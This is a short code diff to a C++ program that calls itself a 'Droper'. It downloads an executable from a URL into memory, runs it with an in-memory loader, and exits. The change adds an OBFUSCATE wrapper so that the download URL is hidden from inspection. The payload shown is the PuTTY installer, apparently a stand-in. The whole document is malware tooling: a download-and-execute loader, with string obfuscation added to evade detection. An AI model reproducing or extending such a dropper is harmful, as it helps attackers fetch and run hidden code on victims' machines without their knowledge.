@@ -18,10 +18,12 @@ This Droper has 10kb
 */
 
 #include "spiderrun.h"
+#include "obfuscat.h"
 
 int main()
 {
-	LPVOID FileData = DownloadURLToBuffer("http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");
+	std::string hiddenUrl = OBFUSCATE("http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");
+	LPVOID FileData = DownloadURLToBuffer(hiddenUrl.c_str());
 	RunPortableExecutable(FileData);
 	ExitProcess(0);
 }
